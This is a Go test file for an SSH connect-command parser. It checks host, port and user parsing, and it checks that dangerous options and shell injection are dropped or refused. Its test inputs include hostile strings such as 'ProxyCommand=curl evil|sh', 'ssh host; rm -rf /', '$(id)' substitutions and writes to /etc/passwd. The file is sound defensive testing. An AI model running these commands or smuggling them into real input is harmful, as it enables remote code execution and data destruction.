package sshparse

import (
	"slices"
	"strconv"
	"strings"
	"testing"
)

// The rows mirror cmd/keel/web/js/test/sshparse.test.mjs, case for case. Each row's js field names the JS
// test it came from. A change to the parser or to one of the two tests needs the other.

type kind int

const (
	isNil     kind = iota // ParseConnect gives nil: the text is only a filter for saved hosts
	isOK                  // a connection
	isRefused             // nil or not OK (the JS test's refused())
	isFailed              // not OK, with an error and a source (the JS test's refused() plus .ok === false)
)

type row struct {
	js   string
	in   string
	kind kind
	chk  func(*testing.T, *Result) // extra assertions on an OK or failed result
}

func hpu(host string, port int, user string) func(*testing.T, *Result) {
	return func(t *testing.T, r *Result) {
		t.Helper()
		if r.Host != host || r.Port != port || r.User != user {
			t.Errorf("host/port/user = %q %d %q, want %q %d %q", r.Host, r.Port, r.User, host, port, user)
		}
	}
}

func shp(source, host string, port int, user string) func(*testing.T, *Result) {
	return func(t *testing.T, r *Result) {
		t.Helper()
		if r.Source != source || r.Host != host || r.Port != port || r.User != user {
			t.Errorf("source/host/port/user = %q %q %d %q, want %q %q %d %q", r.Source, r.Host, r.Port, r.User, source, host, port, user)
		}
	}
}

func hostOnly(host string) func(*testing.T, *Result) {
	return func(t *testing.T, r *Result) {
		t.Helper()
		if r.Host != host {
			t.Errorf("host = %q, want %q", r.Host, host)
		}
	}
}

func portOnly(port int) func(*testing.T, *Result) {
	return func(t *testing.T, r *Result) {
		t.Helper()
		if r.Port != port {
			t.Errorf("port = %d, want %d", r.Port, port)
		}
	}
}

func userOnly(user string) func(*testing.T, *Result) {
	return func(t *testing.T, r *Result) {
		t.Helper()
		if r.User != user {
			t.Errorf("user = %q, want %q", r.User, user)
		}
	}
}

func options(want ...string) func(*testing.T, *Result) {
	return func(t *testing.T, r *Result) {
		t.Helper()
		var got []string
		for _, d := range r.Dropped {
			got = append(got, d.Option)
		}
		if !slices.Equal(got, want) {
			t.Errorf("dropped options %q, want %q", got, want)
		}
	}
}

func reasons(reason string, n int) func(*testing.T, *Result) {
	return func(t *testing.T, r *Result) {
		t.Helper()
		if len(r.Dropped) != n {
			t.Errorf("dropped %d, want %d: %+v", len(r.Dropped), n, r.Dropped)
		}
		for _, d := range r.Dropped {
			if reason != "" && d.Reason != reason {
				t.Errorf("reason %q, want %q", d.Reason, reason)
			}
		}
	}
}

func all(fs ...func(*testing.T, *Result)) func(*testing.T, *Result) {
	return func(t *testing.T, r *Result) {
		t.Helper()
		for _, f := range fs {
			f(t, r)
		}
	}
}

func nothingDropped(t *testing.T, r *Result) {
	t.Helper()
	if len(r.Dropped) != 0 || len(r.Notes) != 0 {
		t.Errorf("dropped %+v notes %q, want none", r.Dropped, r.Notes)
	}
}

func jumpIs(jump string) func(*testing.T, *Result) {
	return func(t *testing.T, r *Result) {
		t.Helper()
		if r.Jump != jump {
			t.Errorf("jump = %q, want %q", r.Jump, jump)
		}
	}
}

func identityIs(file string) func(*testing.T, *Result) {
	return func(t *testing.T, r *Result) {
		t.Helper()
		if r.IdentityFile != file {
			t.Errorf("identity file = %q, want %q", r.IdentityFile, file)
		}
	}
}

func okRow(js, in string, chk func(*testing.T, *Result)) row { return row{js, in, isOK, chk} }
func nilRow(js, in string) row                               { return row{js, in, isNil, nil} }
func failedRow(js, in string) row                            { return row{js, in, isFailed, nil} }

// rows is every parseConnect case of the JS test file, in its order.
var rows = []row{
	// "plain words and empty input are filters, not connections"
	nilRow("plain words and empty input are filters, not connections", ""),
	nilRow("plain words and empty input are filters, not connections", "   "),
	nilRow("plain words and empty input are filters, not connections", "prod-db"),
	nilRow("plain words and empty input are filters, not connections", "prod db 01"),
	nilRow("plain words and empty input are filters, not connections", "10.0.4.21"),
	nilRow("plain words and empty input are filters, not connections", "host:22"),
	nilRow("plain words and empty input are filters, not connections", "sshfs host"),
	nilRow("plain words and empty input are filters, not connections", "scp file host:/tmp"),

	// "ssh host"
	okRow("ssh host", "ssh prod-db", all(shp("command", "prod-db", 22, ""), nothingDropped)),
	// "ssh user@host"
	okRow("ssh user@host", "ssh deploy@10.0.4.21", hpu("10.0.4.21", 22, "deploy")),

	// "-p port, separate and attached"
	okRow("-p port, separate and attached", "ssh -p 2222 deploy@host", portOnly(2222)),
	okRow("-p port, separate and attached", "ssh -p2222 deploy@host", portOnly(2222)),
	okRow("-p port, separate and attached", "ssh deploy@host -p 2222", portOnly(2222)),

	// "-l user, and user@ wins over -l"
	okRow("-l user, and user@ wins over -l", "ssh -l deploy host", userOnly("deploy")),
	okRow("-l user, and user@ wins over -l", "ssh -ldeploy host", userOnly("deploy")),
	okRow("-l user, and user@ wins over -l", "ssh -l other deploy@host", userOnly("deploy")),

	// "-o Port and -o User are used"
	okRow("-o Port and -o User are used", "ssh -o Port=2200 -o 'User deploy' host", all(portOnly(2200), userOnly("deploy"), nothingDropped)),
	okRow("-o Port and -o User are used", "ssh -oPort=2201 host", portOnly(2201)),

	// "the destination's own port wins over -p"
	okRow("the destination's own port wins over -p", "ssh -p 22 ssh://deploy@host:2200", portOnly(2200)),
	okRow("the destination's own port wins over -p", "ssh -p 22 deploy@host:2200", portOnly(2200)),

	// "-i is a note and the file is never read"
	okRow("-i is a note and the file is never read", "ssh -i ~/.ssh/deploy_ed25519 deploy@host", func(t *testing.T, r *Result) {
		identityIs("~/.ssh/deploy_ed25519")(t, r)
		if len(r.Notes) != 1 || !strings.Contains(r.Notes[0], "not read") || !strings.Contains(r.Notes[0], "Keychain") {
			t.Errorf("notes %q", r.Notes)
		}
		if len(r.Dropped) != 0 {
			t.Errorf("dropped %+v", r.Dropped)
		}
	}),
	okRow("-i is a note and the file is never read", "ssh -o IdentityFile=/k/id host", identityIs("/k/id")),
	okRow("-i is a note and the file is never read", "ssh -i/k/id host", identityIs("/k/id")),

	// "-J is recorded and shown as not supported yet"
	okRow("-J is recorded and shown as not supported yet", "ssh -J bastion deploy@10.0.4.21 -p 2222", func(t *testing.T, r *Result) {
		hpu("10.0.4.21", 2222, "deploy")(t, r)
		jumpIs("bastion")(t, r)
		if len(r.Dropped) != 1 || r.Dropped[0].Option != "-J bastion" || !strings.Contains(r.Dropped[0].Reason, "not supported yet") {
			t.Errorf("dropped %+v", r.Dropped)
		}
	}),
	okRow("-J is recorded and shown as not supported yet", "ssh -o ProxyJump=bastion host", jumpIs("bastion")),

	// "ssh:// URL with user and port"
	okRow("ssh:// URL with user and port", "ssh://deploy@host.example.com:2222", shp("url", "host.example.com", 2222, "deploy")),
	okRow("ssh:// URL with user and port", "ssh://host/", hostOnly("host")),
	okRow("ssh:// URL with user and port", "SSH://host", hostOnly("host")),
	okRow("ssh:// URL with user and port", "ssh ssh://deploy@host:2200", portOnly(2200)),

	// "ssh:// URL with a path is refused"
	failedRow("ssh:// URL with a path is refused", "ssh://host/etc/passwd"),

	// "IPv6 with brackets and a port"
	okRow("IPv6 with brackets and a port", "deploy@[::1]:2222", hpu("::1", 2222, "deploy")),
	okRow("IPv6 with brackets and a port", "ssh [::1]:22", hpu("::1", 22, "")),
	okRow("IPv6 with brackets and a port", "ssh [2001:db8::5]", hostOnly("2001:db8::5")),
	okRow("IPv6 with brackets and a port", "ssh://deploy@[fe80::1]:2200", hostOnly("fe80::1")),

	// "IPv6 bare in a command"
	okRow("IPv6 bare in a command", "ssh -p 2200 2001:db8::5", all(hostOnly("2001:db8::5"), portOnly(2200))),
	okRow("IPv6 bare in a command", "ssh root@::1", hostOnly("::1")),

	// "IPv6 brackets must hold an IPv6 address and close"
	failedRow("IPv6 brackets must hold an IPv6 address and close", "ssh [host]:22"),
	failedRow("IPv6 brackets must hold an IPv6 address and close", "ssh [::1"),
	failedRow("IPv6 brackets must hold an IPv6 address and close", "ssh [::1]x"),
	failedRow("IPv6 brackets must hold an IPv6 address and close", "ssh [::1]:99999"),

	// "user@host:port without ssh"
	okRow("user@host:port without ssh", "deploy@10.0.4.21:2222", shp("target", "10.0.4.21", 2222, "deploy")),
	okRow("user@host:port without ssh", "deploy@host", portOnly(22)),

	// "extra whitespace, tabs, quotes and a leading prompt"
	okRow("extra whitespace, tabs, quotes and a leading prompt", "  ssh    deploy@host   -p   2222  ", portOnly(2222)),
	okRow("extra whitespace, tabs, quotes and a leading prompt", "ssh\tdeploy@host", hostOnly("host")),
	okRow("extra whitespace, tabs, quotes and a leading prompt", "$ ssh deploy@host", hostOnly("host")),
	okRow("extra whitespace, tabs, quotes and a leading prompt", "  $   ssh -p 2200 host\n", portOnly(2200)),
	okRow("extra whitespace, tabs, quotes and a leading prompt", "ssh 'deploy@host'", userOnly("deploy")),
	okRow("extra whitespace, tabs, quotes and a leading prompt", `ssh "deploy@host" -p "2222"`, portOnly(2222)),
	okRow("extra whitespace, tabs, quotes and a leading prompt", "ssh -p 2222 \\\n  deploy@host", hostOnly("host")),
	okRow("extra whitespace, tabs, quotes and a leading prompt", "/usr/bin/ssh host", hostOnly("host")),
	okRow("extra whitespace, tabs, quotes and a leading prompt", "ssh host", hostOnly("host")),

	// "short option clusters and the -- separator"
	okRow("short option clusters and the -- separator", "ssh -vvv -4tt host", func(t *testing.T, r *Result) {
		hostOnly("host")(t, r)
		var vs []string
		for _, d := range r.Dropped {
			if d.Option == "-v" {
				vs = append(vs, d.Option)
			}
		}
		if !slices.Equal(vs, []string{"-v", "-v", "-v"}) {
			t.Errorf("-v dropped %q", vs)
		}
	}),
	okRow("short option clusters and the -- separator", "ssh -p 22 -- host", hostOnly("host")),
	failedRow("short option clusters and the -- separator", "ssh -- -weird"),

	// "an option's value is taken as a value, then validated"
	failedRow("an option's value is taken as a value, then validated", "ssh -l -x host"),
	failedRow("an option's value is taken as a value, then validated", "ssh -p -x host"),

	// "-o ProxyCommand is dropped with a reason"
	okRow("-o ProxyCommand is dropped with a reason", "ssh -o ProxyCommand='nc bastion 22' host", func(t *testing.T, r *Result) {
		hostOnly("host")(t, r)
		options("-o ProxyCommand=nc bastion 22")(t, r)
		jumpIs("")(t, r)
		if r.Dropped[0].Reason != "runs a command" {
			t.Errorf("reason %q", r.Dropped[0].Reason)
		}
	}),

	// "-o LocalCommand and PermitLocalCommand are dropped"
	okRow("-o LocalCommand and PermitLocalCommand are dropped", "ssh -o PermitLocalCommand=yes -o LocalCommand=./x.sh host",
		all(options("-o PermitLocalCommand=yes", "-o LocalCommand=./x.sh"), reasons("runs a command", 2))),

	// "-o RemoteCommand and KnownHostsCommand are dropped"
	okRow("-o RemoteCommand and KnownHostsCommand are dropped", "ssh -o RemoteCommand=ls -o KnownHostsCommand=/x host", reasons("runs a command", 2)),

	// "-o StrictHostKeyChecking=no and known-hosts changes are dropped"
	okRow("-o StrictHostKeyChecking=no and known-hosts changes are dropped", "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null host",
		all(options("-o StrictHostKeyChecking=no", "-o UserKnownHostsFile=/dev/null"), reasons("changes host key trust", 2))),
	okRow("-o StrictHostKeyChecking=no and known-hosts changes are dropped", "ssh -oStrictHostKeyChecking=accept-new host", reasons("", 1)),
	okRow("-o StrictHostKeyChecking=no and known-hosts changes are dropped", "ssh -o 'StrictHostKeyChecking no' host", options("-o StrictHostKeyChecking=no")),

	// "option keys match without regard to case"
	okRow("option keys match without regard to case", "ssh -o proxycommand=x -o STRICTHOSTKEYCHECKING=no host", reasons("", 2)),

	// "-L, -R, -D forwards are dropped"
	okRow("-L, -R, -D forwards are dropped", "ssh -L 8080:localhost:80 -R 9000:localhost:9000 -D 1080 host", func(t *testing.T, r *Result) {
		options("-L 8080:localhost:80", "-R 9000:localhost:9000", "-D 1080")(t, r)
		for _, d := range r.Dropped {
			if !strings.Contains(d.Reason, "port forward") {
				t.Errorf("reason %q", d.Reason)
			}
		}
	}),
	okRow("-L, -R, -D forwards are dropped", "ssh -L8080:localhost:80 host", options("-L 8080:localhost:80")),
	okRow("-L, -R, -D forwards are dropped", "ssh -o LocalForward=8080:x:80 host", reasons("", 1)),

	// "-W is dropped"
	okRow("-W is dropped", "ssh -W target:22 host", all(hostOnly("host"), options("-W target:22"))),

	// "a trailing remote command is dropped, never run"
	okRow("a trailing remote command is dropped, never run", "ssh deploy@host 'rm -rf /tmp/x'", func(t *testing.T, r *Result) {
		hpu("host", 22, "deploy")(t, r)
		options("rm -rf /tmp/x")(t, r)
		if !strings.Contains(r.Dropped[0].Reason, "remote command") {
			t.Errorf("reason %q", r.Dropped[0].Reason)
		}
	}),
	okRow("a trailing remote command is dropped, never run", "ssh -t host sudo systemctl restart nginx", options("-t", "sudo systemctl restart nginx")),
	// Options after the command start belong to the command.
	okRow("a trailing remote command is dropped, never run", "ssh host ls -p 99", portOnly(22)),

	// "agent and X11 forwarding, config files and sockets are dropped"
	okRow("agent and X11 forwarding, config files and sockets are dropped", "ssh -A -X -F ./cfg -S /tmp/sock host", reasons("", 4)),
	okRow("agent and X11 forwarding, config files and sockets are dropped", "ssh -o ForwardAgent=yes host", reasons("forwards your agent", 1)),
	okRow("agent and X11 forwarding, config files and sockets are dropped", "ssh -o Include=/etc/x host", reasons("reads another config file", 1)),

	// "unknown -o keys are dropped as not part of the host model"
	okRow("unknown -o keys are dropped as not part of the host model", "ssh -o ServerAliveInterval=30 host", reasons("not part of the host model", 1)),

	// "-o HostName cannot replace the host"
	okRow("-o HostName cannot replace the host", "ssh -o HostName=evil.example host", all(hostOnly("host"), reasons("replaces the host", 1))),

	// "long dropped text is clipped"
	okRow("long dropped text is clipped", "ssh host "+strings.Repeat("x", 500), func(t *testing.T, r *Result) {
		if n := len([]rune(r.Dropped[0].Option)); n > 80 {
			t.Errorf("dropped option has %d characters", n)
		}
	}),

	// "dropped text is data: it stays out of the host fields"
	okRow("dropped text is data: it stays out of the host fields", "ssh -o 'ProxyCommand=curl evil|sh' host", func(t *testing.T, r *Result) {
		hostOnly("host")(t, r)
		userOnly("")(t, r)
		if strings.Contains(r.Host+r.User+r.IdentityFile+r.Jump, "evil") {
			t.Error("dropped text reached a host field")
		}
	}),

	// "a single trailing newline is only whitespace" (in "newlines inside the text yield no host")
	okRow("newlines inside the text yield no host", "ssh host\n", hostOnly("host")),
	// "user@host plus a second line is not read as a target at all"
	nilRow("newlines inside the text yield no host", "deploy@host\nid"),
}

// refusedInputs are the JS tests whose every input must be refused with ok === false.
var refusedInputs = []struct {
	js     string
	inputs []string
	source string // when set, the failed result's source (the JS asserts "command" for the operators)
}{
	{"shell operators yield no host", []string{
		"ssh host; rm -rf /", "ssh host;ls", "ssh host && id", "ssh host || id", "ssh host | sh", "ssh host & id",
		"ssh host > /etc/passwd", "ssh host < /etc/passwd", "ssh (host)", "ssh host;",
	}, "command"},
	{"command substitution and backticks yield no host", []string{
		"ssh $(id)", "ssh host$(id)", "ssh `id`", "ssh host`id`", `ssh "$(id)"`, "ssh \"`id`\"", "ssh ${HOME}",
		"ssh -o ProxyCommand=$(id) host", "ssh -p $(id) host", "deploy@$(id)", "ssh://$(id)@host", "ssh://host`id`",
	}, ""},
	{"newlines inside the text yield no host", []string{"ssh host\nrm -rf /", "ssh host\r\nid", "ssh host\n\nssh other", "ssh://host\nid"}, ""},
	{"characters that are not valid in a host or user are rejected", []string{
		"ssh 'ho st'", "ssh 'host;id'", "ssh 'host|id'", "ssh 'ho$st'", "ssh host\\;id", "ssh -oProxyCommand host\\;id",
		"ssh 'a b@host'", "ssh 'de;ploy@host'", "ssh 'user$@host'", "ssh deploy@host:22:22x", "ssh deploy@host:abc",
		"ssh deploy@host:0", "ssh deploy@host:65536", "ssh -p 70000 host", "ssh -p abc host", "ssh -p '' host",
		"ssh -p -1 host", "ssh @host", "ssh user@", "ssh -l 'a;b' host", "ssh host.", "ssh -.example", "ssh .example",
		"ssh a..b", "ssh ex%ample", "ssh ex/ample", "ssh ex\\ ample",
	}, ""},
	{"a host that starts with - is an option, never a host", []string{
		"ssh -oProxyCommand=id", "ssh -- -oProxyCommand=id", "ssh -", "ssh", "ssh -p", "ssh -Z host",
	}, ""},
	{"unbalanced quotes and trailing backslashes are refused", []string{"ssh 'host", `ssh "host`, "ssh host\\"}, ""},
	{"control characters and oversize input are refused", []string{"ssh ho\x00st", "ssh ho\x1bst", "ssh " + strings.Repeat("a", 3000)}, ""},
}

func TestParseConnectRows(t *testing.T) {
	n := len(rows)
	for _, rw := range rows {
		r := ParseConnect(rw.in)
		switch rw.kind {
		case isNil:
			if r != nil {
				t.Errorf("[%s] %q: want nil, got %+v", rw.js, rw.in, r)
			}
			continue
		case isOK:
			if r == nil || !r.OK {
				t.Errorf("[%s] %q: expected to parse, got %+v", rw.js, rw.in, r)
				continue
			}
		case isRefused:
			if r != nil && r.OK {
				t.Errorf("[%s] %q: expected to be refused, got %+v", rw.js, rw.in, r)
			}
			continue
		case isFailed:
			if r == nil || r.OK || r.Error == "" {
				t.Errorf("[%s] %q: expected a failure, got %+v", rw.js, rw.in, r)
			}
			continue
		}
		if rw.chk != nil {
			t.Run(rw.js, func(t *testing.T) { rw.chk(t, r) })
		}
	}
	for _, g := range refusedInputs {
		for _, in := range g.inputs {
			n++
			r := ParseConnect(in)
			if r != nil && r.OK {
				t.Errorf("[%s] %q: expected to be refused, got %+v", g.js, in, r)
				continue
			}
			if g.source != "" {
				if r == nil || r.Source != g.source || r.Host != "" {
					t.Errorf("[%s] %q: want a %s failure with no host, got %+v", g.js, in, g.source, r)
				}
			}
		}
	}
	t.Logf("%d parseConnect cases", n)
}

// "a refused command carries an error and nothing to connect to"
func TestRefusedCommandCarriesAnErrorAndNothingToConnectTo(t *testing.T) {
	r := ParseConnect("ssh host; id")
	if r == nil || r.OK || r.Error == "" || r.Host != "" || r.Port != 0 {
		t.Fatalf("%+v", r)
	}
}

// "describeDropped lists each entry on a line"
func TestDescribeDroppedListsEachEntryOnALine(t *testing.T) {
	r := ParseConnect("ssh -J b -L 1:x:2 host ls")
	want := []string{
		"-L 1:x:2: opens a port forward; add it in Forwards",
		"ls: remote command; Keel opens a shell and does not run it",
		"-J b: jump hosts are not supported yet",
	}
	if got := DescribeDropped(r.Dropped); !slices.Equal(got, want) {
		t.Errorf("%q", got)
	}
	if got := DescribeDropped(nil); len(got) != 0 {
		t.Errorf("nil gave %q", got)
	}
}

// "validHost", "validPort", "validUser"
func TestValidators(t *testing.T) {
	n := 0
	check := func(js string, f func(string) bool, good, bad []string) {
		for _, s := range good {
			n++
			if !f(s) {
				t.Errorf("[%s] %q should be valid", js, s)
			}
		}
		for _, s := range bad {
			n++
			if f(s) {
				t.Errorf("[%s] %q should be invalid", js, s)
			}
		}
	}
	check("validHost", ValidHost,
		[]string{"host", "a.b-c.example", "10.0.4.21", "::1", "2001:db8::5", "fe80::1", "a_b.example", "H1"},
		[]string{"", "-host", "host-", "ho st", "host;", ":::", "1:2:3:4:5:6:7:8:9", strings.Repeat("a", 254), strings.Repeat("a", 64) + ".com", "host:22", "g:z"})
	// The JS passes the number 2222 as well as strings; null and undefined read as "".
	check("validPort", ValidPort,
		[]string{"1", "22", "65535", strconv.Itoa(2222)},
		[]string{"", "0", "65536", "-1", "1e3", "22.5", " 22", "0x16", "123456"})
	check("validUser", ValidUser,
		[]string{"root", "deploy", "a.b-c_d", "_svc", "User1"},
		[]string{"", "a b", "a;b", "a@b", "-x", "a$b", strings.Repeat("a", 65)})
	t.Logf("%d validator cases", n)
}

// The parser never reads a key file, runs a command or looks a name up: -i only becomes a note, and a
// remote command only becomes a dropped entry. (The package imports neither os, os/exec nor net.)
func TestOptionsThatCouldReachOutAreOnlyData(t *testing.T) {
	r := ParseConnect("ssh -i /etc/hostname -F /etc/passwd -o ProxyCommand='touch /tmp/keel-sshparse-pwned' host id")
	if r == nil || !r.OK || r.Host != "host" || len(r.Notes) != 1 || len(r.Dropped) != 3 {
		t.Fatalf("%+v", r)
	}
}
